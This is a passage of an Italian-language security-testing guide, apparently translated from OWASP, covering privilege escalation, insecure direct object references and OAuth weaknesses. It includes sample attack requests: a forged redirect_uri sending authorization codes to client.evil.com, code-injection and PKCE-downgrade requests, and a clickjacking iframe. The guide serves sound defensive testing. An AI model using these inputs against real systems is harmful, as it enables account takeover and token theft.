    @0`1`3`3``0`UC`1`Status`OK`SEC`5`1`0`ResultSet`0`PVValid`-1`0`0` Notifications`0`0`3`Command  Manager`0`0`0` StateToolsBar`0`0`0`
    StateExecToolBar`0`0`0`FlagsToolBar`0

Il server dà implicitamente fiducia all'utente. Crede che l'utente risponderà con il messaggio sopra chiudendo la sessione.
In questa condizione, verificare che non sia possibile escalare i privilegi modificando i valori dei parametri. In questo particolare esempio, modificando il valore di PVValid da -1 a 0 (nessuna condizione di errore), potrebbe essere possibile autenticarsi come amministratore nel server.

*Manipolazione dell'indirizzo IP*
Alcuni siti limitano l'accesso o contano il numero di tentativi di accesso falliti in base all'indirizzo IP.

    X-Forwarded-For: 8.1.1.1

In questo caso, se il sito utilizza il valore di X-forwarded-For come indirizzo IP del client, il tester potrebbe modificare il valore dell'intestazione HTTP X-forwarded-For per aggirare l'identificazione della sorgente IP.

**Test per il bypass verticale dello schema di autorizzazione**
Un bypass verticale dell'autorizzazione è specifico per il caso in cui un attaccante ottiene un ruolo più alto del proprio. Il test per questo bypass si concentra sulla verifica di come è stato implementato lo schema di autorizzazione verticale per ogni ruolo. Per ogni funzione, pagina, ruolo specifico o richiesta che l'applicazione esegue, è necessario verificare se è possibile:
* Accedere a risorse che dovrebbero essere accessibili solo a un utente con un ruolo più alto.
*     Operare funzioni su risorse che dovrebbero essere operative solo da un utente che detiene un'identità di ruolo più alta o specifica.

Per ogni ruolo:
* Registrare un utente
* Stabilire e mantenere due sessioni diverse basate sui due diversi ruoli
* Per ogni richiesta, cambiare l'identificativo di sessione dall'originale a quello di un altro ruolo e valutare le risposte per ciascuna.
* Un'applicazione sarà considerata vulnerabile se la sessione con privilegi più deboli contiene gli stessi dati o indica operazioni riuscite su funzioni con privilegi più elevati.
<br>

**Attraversamento di URL**
Provare a traversare il sito e controllare se alcune pagine possono mancare della verifica di autorizzazione.

    /../.././userInfo.html

**White box** 
Se il controllo dell'autorizzazione dell'URL viene eseguito solo tramite una corrispondenza parziale dell'URL, è probabile che i tester o gli hacker possano aggirare l'autorizzazione mediante tecniche di codifica dell'URL.
Ad esempio: startswith(), endswith(), contains(), indexOf().

**Rimedio**
* Definisci chiaramente i ruoli e i privilegi. Ogni azione deve essere associata a un controllo che verifichi se l'utente ha i diritti necessari.

#### 4 - Test per riferimenti diretti non sicuri ad oggetti
I Riferimenti Diretti a Oggetti Non Sicuri permettono agli attaccanti di bypassare l'autorizzazione e accedere direttamente a risorse modificando il valore di un parametro usato per puntare direttamente a un oggetto. Questa vulnerabilità consente agli attaccanti di bypassare l'autorizzazione e accedere direttamente a risorse nel sistema, come ad esempio record di database o file.

**Come testarlo**
Per testare questa vulnerabilità, il tester deve prima mappare tutte le posizioni nell'applicazione in cui l'input dell'utente è usato per fare riferimento direttamente a oggetti. Ad esempio, posizioni in cui l'input dell'utente è utilizzato per accedere a una riga del database, a un file, a pagine dell'applicazione e altro. Successivamente, il tester dovrebbe modificare il valore del parametro utilizzato per fare riferimento agli oggetti e valutare se è possibile recuperare oggetti appartenenti ad altri utenti o bypassare l'autorizzazione.

Il modo migliore per testare i riferimenti diretti a oggetti è avere almeno due (spesso più) utenti per coprire diversi oggetti e funzioni posseduti. Ad esempio, due utenti che hanno accesso a oggetti diversi (come informazioni di acquisto, messaggi privati, ecc.), e (se rilevante) utenti con privilegi diversi (ad esempio, utenti amministratori) per vedere se ci sono riferimenti diretti alle funzionalità dell'applicazione. Avere più utenti consente al tester di risparmiare tempo prezioso nel tentare di indovinare i nomi degli oggetti, poiché può tentare di accedere a oggetti che appartengono all'altro utente.

Di seguito sono riportati diversi scenari tipici per questa vulnerabilità e i metodi per testare ciascuno:

*Il Valore di un Parametro è Usato Direttamente per Recuperare un Record del Database*

    http://foo.bar/somepage?invoice=12345

<br>

*Il Valore di un Parametro è Usato Direttamente per Eseguire un'Operazione nel Sistema*

    http://foo.bar/changepassword?user=someuser

In questo caso, il valore del parametro user è utilizzato per indicare all'applicazione per quale utente deve cambiare la password. Spesso, questo passaggio fa parte di una procedura guidata o di un'operazione a più fasi. Nel primo passo, l'applicazione riceve una richiesta che indica per quale utente deve essere cambiata la password e nel passaggio successivo l'utente fornisce una nuova password (senza chiedere quella attuale).
Il parametro user è utilizzato per fare riferimento direttamente all'oggetto dell'utente per il quale verrà eseguita l'operazione di cambio password. Per testare questo caso, il tester dovrebbe tentare di fornire un nome utente di test diverso da quello attualmente connesso e controllare se è possibile modificare la password di un altro utente.

*Il Valore di un Parametro è Usato Direttamente per Recuperare una Risorsa del File System*

    http://foo.bar/showImage?img=img00011

Per testare questo caso, il tester dovrebbe ottenere un riferimento a un file che l'utente non dovrebbe essere in grado di accedere e tentare di accedervi utilizzando tale riferimento come valore del parametro file. Nota: Questa vulnerabilità è spesso sfruttata insieme a una vulnerabilità di traversata di directory/percorso.

*Il valore di un parametro è usato direttamente per accedere alle funzionalità dell'applicazione*

    http://foo.bar/accessPage?menuitem=12

Supponiamo che all'utente sia impedito di accedere ad alcune funzionalità e abbia accesso solo alle voci di menu 1, 2 e 3. Modificando il valore del parametro menuitem, è possibile bypassare l'autorizzazione e accedere a funzionalità aggiuntive dell'applicazione.

Negli esempi sopra, la modifica di un singolo parametro è sufficiente. Tuttavia, a volte il riferimento a un oggetto può essere suddiviso tra più parametri e i test dovrebbero essere adattati di conseguenza.

#### 5 - Test per le vulnerabilità di OAuth
*Ciao, sono Filippo: questa sezione è complicatissima e necessiterebbe di studi a parte solo per comprendere davvero di cosa parla, metto quindi qui sotto la traduzione parola per parola e non un riassunto perché non saprei cosa tagliare.*

**Sintesi**
OAuth2.0 (di seguito denominato OAuth) è un framework di autorizzazione che consente a un client di accedere alle risorse per conto del proprio utente.
Per raggiungere questo obiettivo, OAuth si basa fortemente sui token per comunicare tra le diverse entità, ciascuna con un ruolo specifico:
* **Proprietario della Risorsa**: L'entità che concede accesso a una risorsa, che di solito è l'utente stesso.
* **Client**: L'applicazione che richiede accesso a una risorsa per conto del Proprietario della Risorsa. Questi client possono essere di due tipi:
    * **Pubblici**: client che non possono proteggere un segreto (ad es. applicazioni front-end come SPA, applicazioni mobili, ecc.).
    * **Riservati**: client in grado di autenticarsi in modo sicuro con il server di autorizzazione mantenendo i propri segreti registrati al sicuro (ad es. servizi backend).
* **Server di Autorizzazione**: Il server che detiene le informazioni di autorizzazione e concede l'accesso.
* **Server di Risorse**: L'applicazione che fornisce i contenuti accessibili dal client.

Poiché la responsabilità di OAuth è delegare i diritti di accesso dal proprietario al client, questo rappresenta un obiettivo molto allettante per gli aggressori, e implementazioni errate possono portare ad accessi non autorizzati alle risorse e alle informazioni degli utenti.
Per fornire accesso a un'applicazione client, OAuth si basa su diversi tipi di concessione di autorizzazione per generare un token di accesso:
* **Codice di Autorizzazione**: utilizzato da client riservati e pubblici per scambiare un codice di autorizzazione per un token di accesso, ma raccomandato solo per client riservati.
* **Proof Key for Code Exchange (PKCE)**: PKCE si basa sulla concessione del Codice di Autorizzazione, fornendo una sicurezza più robusta per l'uso da parte di client pubblici e migliorando la postura di quelli riservati.
* **Credenziali del Client**: utilizzato per la comunicazione macchina a macchina, dove l'"utente" è la macchina che richiede accesso alle proprie risorse dal Server di Risorse.
* **Codice Dispositivo**: utilizzato per dispositivi con capacità di input limitate.
* **Token di Aggiornamento**: token forniti dal server di autorizzazione per consentire ai client di aggiornare i token di accesso degli utenti una volta che diventano non validi o scadono. Questo tipo di concessione è utilizzato insieme a un altro tipo di concessione.

Due flussi saranno deprecati con il rilascio di OAuth2.1 e il loro utilizzo non è raccomandato:
* **Flusso Implicito**: l'implementazione sicura di PKCE rende questo flusso obsoleto. Prima di PKCE, il flusso implicito veniva utilizzato da applicazioni client-side come le single page applications, poiché CORS ha allentato la politica di stessa origine per consentire la comunicazione tra siti. Per ulteriori informazioni sul motivo per cui la concessione implicita non è raccomandata, consulta questa sezione.
* **Credenziali della Password del Proprietario della Risorsa**: utilizzato per scambiare le credenziali degli utenti direttamente con il client, che poi le invia all'autorizzazione per scambiarle con un token di accesso. Per informazioni sul motivo per cui questo flusso non è raccomandato, consulta questa sezione.

Nota: il flusso implicito in OAuth è solo deprecato, ma è ancora una soluzione valida all'interno di Open ID Connect (OIDC) per recuperare id_tokens. Fai attenzione a capire come viene utilizzato il flusso implicito, che può essere identificato se viene utilizzato solo l'endpoint /authorization per ottenere un token di accesso, senza fare affidamento in alcun modo sull'endpoint /token. Un esempio su questo può essere trovato qui.
Si prega di notare che i flussi OAuth sono un argomento complesso e quanto sopra include solo un riepilogo delle aree chiave. I riferimenti inline contengono ulteriori informazioni sui flussi specifici.

**Obiettivi del test**
Determinare se l'implementazione di OAuth2 è vulnerabile o utilizza un'implementazione deprecata o personalizzata.

**Come testarlo**
**Testing per Tipi di Concessione Deprecati**
I tipi di concessione deprecati sono stati obsoleti per motivi di sicurezza e funzionalità. Identificare se vengono utilizzati ci consente di rivedere rapidamente se sono suscettibili a minacce legate al loro utilizzo. Alcuni potrebbero essere al di fuori dell'ambito per l'aggressore, come il modo in cui un client potrebbe utilizzare le credenziali degli utenti. Questo dovrebbe essere documentato e segnalato ai team di ingegneria interni.
Per i client pubblici, è generalmente possibile identificare il tipo di concessione nella richiesta all'endpoint /token. Viene indicato nello scambio di token con il parametro grant_type.
L'esempio seguente mostra la concessione del Codice di Autorizzazione con PKCE.

    POST /oauth/token HTTP/1.1
    Host: as.example.com
    [...]

    {
    "client_id":"example-client",
    "code_verifier":"example",
    "grant_type":"authorization_code",
    "code":"example",
    "redirect_uri":"http://client.example.com"
    }

I valori per il parametro grant_type e il tipo di concessione che indicano sono:
* **password**: indica la concessione ROPC.
* **client_credentials**: indica la concessione delle Credenziali del Client.
* **authorization_code**: indica la concessione del Codice di Autorizzazione.

Il tipo di Flusso Implicito non è indicato dal parametro grant_type poiché il token viene presentato nella risposta alla richiesta dell'endpoint /authorization e può essere identificato tramite il response_type. Di seguito è riportato un esempio.

    GET /authorize
    ?client_id=<some_client_id>
    &response_type=token 
    &redirect_uri=https%3A%2F%2Fclient.example.com%2F
    &scope=openid%20profile%20email
    &state=<random_state>

I seguenti parametri URL indicano il flusso OAuth utilizzato:
* **response_type=token**: indica il Flusso Implicito, poiché il client sta richiedendo direttamente al server di autorizzazione di restituire un token.
* **response_type=code**: indica il Flusso del Codice di Autorizzazione, poiché il client sta richiedendo al server di autorizzazione di restituire un codice, che verrà poi scambiato con un token.
* **code_challenge=sha256(xyz)**: indica l'estensione PKCE, poiché nessun altro flusso utilizza questo parametro.

Di seguito è riportato un esempio di richiesta di autorizzazione per il Flusso del Codice di Autorizzazione con PKCE:

    GET /authorize
        ?redirect_uri=https%3A%2F%2Fclient.example.com%2F
        &client_id=<some_client_id>
        &scope=openid%20profile%20email
        &response_type=code
        &response_mode=query
        &state=<random_state>
        &nonce=<random_nonce>
        &code_challenge=<random_code_challenge>
        &code_challenge_method=S256 HTTP/1.1
    Host: as.example.com
    [...]

**Client pubblici**
La concessione del Codice di Autorizzazione con estensione PKCE è raccomandata per i client pubblici. Una richiesta di autorizzazione per il Flusso del Codice di Autorizzazione con PKCE dovrebbe contenere response_type=code e code_challenge=sha256(xyz).
Lo scambio di token dovrebbe contenere il tipo di concessione authorization_code e un code_verifier.
I tipi di concessione impropri per i client pubblici sono:
* Concessione del Codice di Autorizzazione senza l'estensione PKCE
* Credenziali del Client
* Flusso Implicito
* ROPC

**Client riservati**
La concessione del Codice di Autorizzazione è raccomandata per i client riservati. L'estensione PKCE può essere utilizzata.
I tipi di concessione impropri per i client riservati sono:
* Credenziali del Client (eccetto per le comunicazioni macchina a macchina -- vedere sotto)
* Flusso Implicito
* ROPC

**Macchina a macchina**
In situazioni in cui non si verifica interazione dell'utente e i client sono solo client riservati, può essere utilizzata la concessione delle Credenziali del Client.
Se si conoscono client_id e client_secret, è possibile ottenere un token passando il tipo di concessione client_credentials.

    $ curl --request POST \
    --url https://as.example.com/oauth/token \
    --header 'content-type: application/json' \
    --data '{"client_id":"<some_client_id>","client_secret":"<some_client_secret>","grant_type":"client_credentials"}' --proxy http://localhost:8080/ -k

**Fuga di credenziali**
A seconda del flusso, OAuth trasporta diversi tipi di credenziali come parametri URL.
I seguenti token possono essere considerati credenziali trapelate:
* token di accesso
* token di aggiornamento
* codice di autorizzazione
* sfida del codice PKCE / code verifier

A causa di come funziona OAuth, il codice di autorizzazione così come il code_challenge e il code_verifier possono far parte dell'URL. Il flusso implicito trasporta il token di autorizzazione come parte dell'URL se il response_mode non è impostato su form_post. Questo può portare alla fuga del token o del codice richiesto nell'intestazione referrer, nei file di log e nei proxy a causa di questi parametri passati nella query o nel frammento.
Il rischio associato alla fuga di token nel flusso implicito è molto più alto rispetto alla fuga del codice o di altri parametri code_*, poiché sono legati a client specifici e più difficili da abusare in caso di fuga.
Per testare questo scenario, utilizza un proxy di intercettazione HTTP come ZAP e intercetta il traffico OAuth.
* Segui il processo di autorizzazione e identifica eventuali credenziali presenti nell'URL.
* Se vengono incluse risorse esterne in una pagina coinvolta nel flusso OAuth, analizza la richiesta inviata a esse. Le credenziali potrebbero essere trapelate nell'intestazione referrer.

Dopo aver seguito il flusso OAuth e utilizzato l'applicazione, alcune richieste vengono catturate nella cronologia delle richieste di un proxy di intercettazione HTTP. Cerca l'intestazione referrer HTTP (ad es. Referer: https://idp.example.com/) contenente il server di autorizzazione e l'URL del client nella cronologia delle richieste.
La revisione dei meta tag HTML (anche se questo tag non è supportato su tutti i browser) o della Referrer-Policy potrebbe aiutare a valutare se ci sia una fuga di credenziali tramite l'intestazione referrer.

**Casi di test correlati**
Testare i JSON Web Tokens

**Rimedi**
* Quando implementi OAuth, considera sempre la tecnologia utilizzata e se l'applicazione è un'applicazione lato server che può evitare di rivelare segreti, o un'applicazione lato client che non può.
* In quasi tutti i casi, utilizza il flusso del Codice di Autorizzazione con PKCE. Un'eccezione può essere rappresentata dai flussi macchina a macchina.
* Utilizza i parametri POST o i valori dell'intestazione per trasportare segreti.
* Quando non ci sono altre possibilità (ad esempio, in applicazioni legacy che non possono essere migrate), implementa intestazioni di sicurezza aggiuntive come una Referrer-Policy.

**Strumenti**
* BurpSuite
* EsPReSSo
* ZAP

#### 6 - Test per le vulnerabilità del server di autenticazione OAuth
*Idem al paragrafo sopra*

**Sommario**
OAuth memorizza le identità degli utenti e i loro corrispondenti diritti di accesso nel Server di Autorizzazione (AS). L'AS svolge un ruolo cruciale durante il flusso OAuth poiché concede ai client l'accesso alle risorse. Per farlo in modo sicuro, deve convalidare correttamente i parametri che fanno parte del flusso OAuth.

La mancata convalida dei parametri può portare al takeover dell'account, all'accesso non autorizzato alle risorse e all'elevazione dei privilegi.

**Obiettivi del test**
- Identificare le debolezze nel Server di Autorizzazione.

**Come testarlo**
Per testare le debolezze dell'AS, mirerai a:

1. Recuperare le credenziali utilizzate per l'autorizzazione.
2. Concederti l'accesso a risorse arbitrarie attraverso la navigazione forzata.
3. Aggirare l'autorizzazione.

**Test per la convalida insufficiente dell'URI di reindirizzamento**
Se il `redirect_uri` non viene convalidato correttamente, è possibile creare un link che contiene un URL che punta a un server controllato da un attaccante. Questo può essere usato per ingannare l'AS e fargli inviare un codice di autorizzazione all'attaccante. Nell'esempio seguente, `client.evil.com` viene utilizzato come `redirect_uri` contraffatto.

    https://as.example.com/authorize?client_id=example-client&redirect_uri=http%3A%2F%client.evil.com%2F&state=example&response_mode=fragment&response_type=code&scope=openid&nonce=example

Se un utente apre questo link nel browser, l'AS reindirizzerà il browser all'URL malevolo.

Un attaccante può catturare il valore del codice passato nell'URL contraffatto e poi inviarlo all'endpoint del token dell'AS.

La seguente richiesta illustra una richiesta di autorizzazione che invia il `redirect_uri` al server di autorizzazione. Il client `client.example.com` invia una richiesta di autorizzazione all'AS `as.example.com` con l'URI di reindirizzamento codificato in URL `http%3A%2F%2Fclient.example.com%2F`.

    GET /authorize
        ?redirect_uri=http%3A%2F%2Fclient.example.com%2F
        &client_id=example-client
        &errorPath=%2Ferror
        &scope=openid%20profile%20email
        &response_type=code
        &response_mode=query
        &state=example
        &nonce=example
        &code_challenge=example
        &code_challenge_method=S256 HTTP/1.1
    Host: as.example.com

L'AS risponde con un reindirizzamento contenente il codice di autorizzazione. Questo può essere scambiato con un token di accesso nella richiesta del token. Come mostrato di seguito, l'URL nell'header Location è l'URI fornito nel precedente parametro `redirect_uri`.

    HTTP/1.1 302 Found
    Date: Mon, 18 Oct 2021 20:46:44 GMT
    Content-Type: text/html; charset=utf-8
    Content-Length: 340
    Location: http://client.example.com/?code=example&state=example

Per testare se l'AS è vulnerabile alla convalida insufficiente dell'URI di reindirizzamento, cattura il traffico con un proxy HTTP di intercettazione come ZAP.

1. Avvia il flusso OAuth e mettilo in pausa alla richiesta di autorizzazione.
2. Modifica il valore del `redirect_uri` e osserva la risposta.
3. Esamina la risposta e identifica se il parametro `redirect_uri` arbitrario è stato accettato dall'AS.

Se l'AS reindirizza il browser all'URI di reindirizzamento che hai specificato, l'AS non convalida correttamente il `redirect_uri`.

Inoltre, consulta la sezione "Bypass dei filtri comuni" in "Test per Server-Side Request Forgery" per identificare i bypass comuni per la convalida dell'URI di reindirizzamento.

**Test per l'iniezione del codice di autorizzazione**
Durante lo scambio del codice nel flusso del codice di autorizzazione, un codice viene emesso dall'AS al client e successivamente scambiato contro l'endpoint del token per recuperare un token di autorizzazione e un token di aggiornamento.

Esegui i seguenti test contro l'AS:

1. Invia un codice valido per un altro `client_id`.
2. Invia un codice valido per un altro proprietario di risorse.
3. Invia un codice valido per un altro `redirect_uri`.
4. Reinvia il codice più di una volta (replay del codice).

**Test per client pubblici**
La richiesta inviata all'endpoint del token contiene il codice di autorizzazione. Viene scambiato contro il token. Cattura questa richiesta con un proxy HTTP di intercettazione come ZAP e reinvia la richiesta con valori modificati.

    POST /oauth/token HTTP/1.1
    Host: as.example.com
    [...]

    {
        "errorPath":"/error",
        "client_id":"example-client",
        "code":"INJECT_CODE_HERE",
        "grant_type":"authorization_code",
        "redirect_uri":"http://client.example.com"
    }

Se l'AS risponde con un `access_token`, l'iniezione del codice è avvenuta con successo.

**Test per client confidenziali**
Poiché il flusso OAuth per i client confidenziali è ulteriormente protetto da un segreto del client, non è possibile inviare direttamente un codice di autorizzazione all'endpoint del token. Invece, inietta il codice di autorizzazione nel client. Questo codice iniettato verrà quindi inviato nella richiesta del token, emessa dal client confidenziale insieme al segreto del client.

Prima, cattura un codice di autorizzazione dall'AS:

1. Avvia il flusso del codice di autorizzazione con l'utente Alice. Metti in pausa quando ricevi un codice dall'AS.
2. Non inviare il codice al client e prendi nota del codice e dello stato corrispondente.

Quindi, inietta il codice:

1. Avvia il flusso del codice di autorizzazione con l'utente Mallory e inietta i valori del codice e dello stato precedentemente raccolti per l'utente Alice nel processo.
2. Quando l'attacco ha successo, il client dovrebbe ora essere in possesso di un `authorization_token` che concede l'accesso alle risorse di proprietà dell'utente Alice.

    GET /callback?code=INJECT_CODE_HERE&state=example HTTP/1.1
    Host: client.example.com
    [...]

**Test per l'attacco di downgrade PKCE**
In determinate circostanze, l'estensione PKCE può essere rimossa dal flusso del codice di autorizzazione. Questo ha il potenziale di lasciare i client pubblici vulnerabili ad attacchi mitigati dall'estensione PKCE.

Ciò può accadere quando:

- L'AS non supporta PKCE.
- L'AS non convalida correttamente PKCE.

Entrambi possono essere testati con un proxy HTTP di intercettazione come ZAP. Esegui i seguenti test:

1. Invia la richiesta di autorizzazione senza i parametri `code_challenge=sha256(xyz)` e `code_challenge_method`.
2. Invia la richiesta di autorizzazione con un valore vuoto per il parametro `code_challenge=sha256(xyz)`.
3. Invia la richiesta di autorizzazione con un valore contraffatto per il parametro `code_challenge=sha256(xyz)`.

L'esempio seguente evidenzia i valori da modificare:

    GET /authorize
        ?redirect_uri=http%3A%2F%client.example.com
        &client_id=example-client
        &errorPath=%2Ferror
        &scope=openid%20profile%20email
        &response_type=code
        &response_mode=web_message
        &state=example-state
        &nonce=example-nonce
        &code_challenge=MODIFY_OR_OMIT_THIS
        &code_challenge_method=MODIFY_OR_OMIT_THIS
        &prompt=none HTTP/1.1
    Host: as.example.com
    [...]

L'AS dovrebbe verificare il valore `code_verifier` nello scambio del token. Per testare:

1. Invia la richiesta del token senza il `code_verifier`.
2. Invia la richiesta del token con un `code_verifier` vuoto.
3. Invia la richiesta del token con un `code_verifier` valido per un codice di autorizzazione diverso.

    POST /oauth/token HTTP/1.1
    Host: as.example.com
    [...]

    {
    "client_id":"example-client",
    "code_verifier":"MODIFY_OR_OMIT_THIS",
    "code":"example",
    "grant_type":"authorization_code",
    "redirect_uri":"http://client.example.com"
    }

**Test per Cross-Site Request Forgery nella pagina di consenso**
Gli attacchi CSRF sono descritti in CSRF. OAuth può essere attaccato con CSRF.

Per prevenire gli attacchi CSRF, OAuth sfrutta il parametro `state` come token anti-CSRF.

Anche altre misure possono prevenire gli attacchi CSRF. Il flusso PKCE mitiga il CSRF. Un valore `nonce` può fungere anche da token anti-CSRF.

Testa ogni richiesta che contiene uno dei parametri anti-CSRF utilizzati da OAuth secondo i test descritti nei casi di test CSRF.

La pagina di consenso viene mostrata a un utente per verificare che questo utente acconsenta all'accesso del client alla risorsa per conto dell'utente. Attaccare la pagina di consenso con CSRF può concedere a un client arbitrario l'accesso a una risorsa per conto dell'utente. I passaggi di questo flusso sono:

1. Il Client genera un parametro `state` e lo invia con la richiesta di consenso.
2. Il browser dell'utente mostra la pagina di consenso.
3. Il proprietario della risorsa concede l'accesso al Client.
4. Il consenso viene inviato all'AS insieme agli scopi riconosciuti.

Usa un proxy HTTP di intercettazione come ZAP per testare se il parametro `state` viene convalidato correttamente.

    POST /u/consent?state=Tampered_State HTTP/1.1
    Host: as.example.com
    [...]

    state=MODIFY_OR_OMIT_THIS
    &audience=https%3A%2F%2Fas.example.com%2Fuserinfo
    &scope%5B%5D=profile
    &scope%5B%5D=email
    &action=accept

**Test per Clickjacking**
Il clickjacking è descritto in "Test per Clickjacking". Quando la pagina di consenso è soggetta a clickjacking e l'attaccante è in possesso del `client_id` (per i client pubblici, o del segreto del client per i client confidenziali), l'attaccante può falsificare il consenso dell'utente e ottenere l'accesso alla risorsa richiesta attraverso un client malevolo.

**Come testarlo**
Affinché questo attacco abbia successo, l'attaccante deve caricare la pagina di autorizzazione in un iframe.

La seguente pagina HTML può essere utilizzata per caricare la pagina di autorizzazione in un iframe:

    <html>
        <head>
            <title>Pagina di test per clickjack</title>
        </head>
        <body>
            <iframe src="http://as.example.com/auth/realms/example/login-actions/required-action?execution=OAUTH_GRANT&client_id=example-client" width="500" height="500"></iframe>
        </body>
    </html>

Se caricata con successo, il sito è vulnerabile al clickjacking.

Vedi "Test per Clickjacking" per una descrizione dettagliata di come un tale attacco può essere condotto.

**Test della durata del token**
OAuth ha due tipi di token: il token di accesso e il token di aggiornamento. Un token di accesso dovrebbe essere limitato nella durata della sua validità. Ciò significa che ha una breve durata: una buona durata dipende dall'applicazione e può essere da 5 a 15 minuti.

Il token di aggiornamento dovrebbe essere valido per una durata più lunga. Dovrebbe essere un token monouso che viene sostituito ogni volta che viene utilizzato.

**Test della convalida della durata del token di accesso**
Quando un JSON Web Token (JWT) viene utilizzato come token di accesso, è possibile recuperare la validità del token di accesso dal JWT decodificato. Questo è descritto in "Test dei JSON Web Token". È possibile che l'AS non convalidi correttamente la durata del JWT.

Per testare la durata del token di accesso, usa un proxy HTTP di intercettazione come ZAP. Intercetta una richiesta a un endpoint che contiene un token di accesso. Metti questa richiesta nel ripetitore e lascia passare il tempo previsto. La validità di un token di accesso dovrebbe essere tra 5 e 15 minuti, a seconda della sensibilità delle risorse.

Tali richieste possono assomigliare all'esempio seguente. Il token potrebbe anche essere trasportato in altri modi, ad esempio in un cookie.

    GET /userinfo HTTP/1.1
    Host: as.example.com
    [...]
    Authorization: Bearer eyJhbGciOiJkaXIiL[...]

Testa la convalida della durata inviando la richiesta dopo che sono trascorsi diversi intervalli di tempo, ad esempio dopo 5 minuti, 10 minuti e 30 minuti.

Questo processo può essere ottimizzato automatizzando i passaggi e registrando la risposta del server. Quando si riceve una risposta con stato HTTP 403 (invece di stato HTTP 200), questo può indicare che il token di accesso non è più valido.

**Test della convalida della durata del token di aggiornamento**

I token di aggiornamento hanno un periodo di validità più lungo rispetto ai token di accesso. A causa della loro lunga validità, dovrebbero essere invalidati dopo essere stati utilizzati in uno scambio contro un token di accesso.

I token di aggiornamento vengono emessi nella stessa richiesta di token in cui il token di accesso viene consegnato al client.

Usa un proxy HTTP di intercettazione come ZAP. Configura il test facendo quanto segue:

1. Recupera un token di aggiornamento valido.
2. Cattura la richiesta che viene utilizzata per scambiare il token di aggiornamento contro un nuovo token di accesso.
3. Invia la richiesta catturata al ripetitore di richieste.

Nel seguente esempio, il token di aggiornamento viene inviato come parte del corpo POST.

    POST /token HTTP/1.1
    Host: as.example.com
    Cookie: [...]
    [...]

    grant_type=refresh_token
    &refresh_token=eyJhbGciOiJIUz[...]
    &client_id=example-client

Esegui i seguenti test:

1. Invia il token di aggiornamento e determina se l'AS fornisce un token di accesso.
2. Ripeti i passaggi con lo stesso token di aggiornamento per valutare quante volte viene accettato un singolo token di aggiornamento.

Quando viene utilizzato un JWT come token di aggiornamento, è possibile recuperare la validità del token di aggiornamento dal JWT decodificato. Questo è descritto in "Test dei JSON Web Token". Il token di aggiornamento può essere valido per un periodo di tempo più lungo, ma dovrebbe avere una data di scadenza.

È possibile ottenere una sicurezza aggiuntiva con un meccanismo di rilevamento dei furti. Se un token di aggiornamento viene utilizzato in uno scambio di token oltre la sua validità (o durata), l'AS invalida tutti i token di aggiornamento. Per testare questo meccanismo:

1. Invia il token di aggiornamento e determina se l'AS fornisce un token di accesso.
2. Ripeti i passaggi con lo stesso token di aggiornamento finché non viene invalidato.
3. Utilizza il token di aggiornamento dall'ultima risposta del token.

Se tutti i token di aggiornamento che sono stati emessi per il client per questo proprietario di risorse vengono invalidati, l'AS ha un rilevamento del furto di token.

#### 7 - Test delle debolezze del client OAuth
*Idem a sopra*

**Sommario**
OAuth concede diritti di accesso sulle risorse ai client. Questo permette loro di agire per conto del proprietario della risorsa. Il client riceve il codice di autorizzazione e il token di aggiornamento nello scambio del token e li memorizza.

La mancata protezione dello scambio di token e delle credenziali può portare all'accesso non autorizzato alle risorse e all'elevazione dei privilegi.

**Obiettivi del test**
- Identificare le debolezze nel client OAuth.

**Come testarlo**
Per testare le debolezze del client, mirerai a:

1. Recuperare le credenziali utilizzate per l'autorizzazione.
2. Concederti l'accesso a risorse arbitrarie attraverso la navigazione forzata.
3. Aggirare l'autorizzazione.

**Test per il segreto del client esposto**
Il segreto del client viene utilizzato per autenticare il client contro il Server di Autorizzazione (AS) al fine di dimostrare che il client è un'origine affidabile.

I client pubblici generalmente non sono in grado di memorizzare il segreto del client in modo sicuro.

Per identificare il segreto del client nel codice lato client, effettua una ricognizione sul codice lato client.

1. Naviga all'applicazione.
2. Apri gli strumenti di sviluppo del browser.
3. Vai alla scheda Debugger.
4. Premi Ctrl+Shift+F per aprire la ricerca.
5. Cerca termini simili a "client-secret" e determina se ne viene trovato qualcuno.

Se questo non ha successo, puoi anche:

1. Seguire il processo di autorizzazione passo passo con un proxy HTTP di intercettazione come ZAP.
2. Recuperare il segreto del client dall'URI nel parametro "client-secret".
3. Sostituire il termine di ricerca nella ricerca precedente con il valore del segreto del client e determinare se è esposto.

**Test per l'archiviazione impropria dei token**
Il client riceve i token di accesso e idealmente li memorizza in una posizione dove questi token possono essere protetti dagli attaccanti.

I client confidenziali dovrebbero memorizzare i token in memoria volatile per prevenire l'accesso attraverso altri attacchi come l'inclusione di file locali, attaccanti in grado di accedere all'ambiente o attacchi di SQL Injection.

I client pubblici, come le applicazioni a pagina singola, non hanno la possibilità di memorizzare i token in modo sicuro. Ad esempio, un attacco di cross-site scripting permette agli attaccanti di accedere alle credenziali memorizzate nel browser.

I client pubblici possono memorizzare i token nella memoria di sessione del browser o in un cookie, ma non nella memoria locale. Per determinare se i token sono memorizzati in modo improprio:

1. Naviga all'applicazione.
2. Recupera un token di accesso.
3. Apri gli strumenti di sviluppo del browser.
4. Vai alla scheda Applicazione.
5. Individua la Memoria Locale e visualizza i dati memorizzati.
6. Individua la Memoria di Sessione e visualizza i dati memorizzati.
7. Individua l'Archivio dei Cookie e visualizza i dati memorizzati.
<br>

**Test per l'iniezione di token di accesso**
Questo attacco è possibile solo quando il client utilizza un tipo di risposta che emette direttamente un token di accesso al client. Ciò avviene con i tipi di concessione Flussi Impliciti, Credenziali Password del Proprietario della Risorsa e flussi da macchina a macchina. Vedi "Test per le debolezze di OAuth" per ulteriori dettagli.

L'iniezione di token di accesso ha successo quando un token di accesso viene trafugato a un attaccante e poi utilizzato per autenticarsi con il client legittimo.

Per testare l'iniezione di token di accesso, segui i passaggi seguenti. In questo esempio, il token di autorizzazione (ZXhhbXBsZQo=) è stato trafugato.

1. Intercetta il traffico tra il client e il server di autorizzazione.
2. Avvia un flusso OAuth con un client che utilizza il tipo di concessione Flusso Implicito.
3. Inietta il token di accesso rubato:
- Invia una risposta di autorizzazione contraffatta con il token di accesso rubato (ZXhhbXBsZQo=) al client.
- Intercetta una risposta di autorizzazione valida e sostituisci il token di accesso (dGVzdGluZwo=) con quello trafugato (ZXhhbXBsZQo=).

Un diagramma del flusso di iniezione del token di accesso
Figura 4.5.5.2-: Flusso di iniezione del token di accesso

**Casi di test correlati**
- Test per Cross Site Request Forgery
- Test per reindirizzamento URL lato client
- Test dei JSON Web Token
- Test per Clickjacking
- Test Cross Origin Resource Sharing

**Rimedi**
- Usa un segreto del client solo se il client ha la capacità di memorizzarlo in modo sicuro.
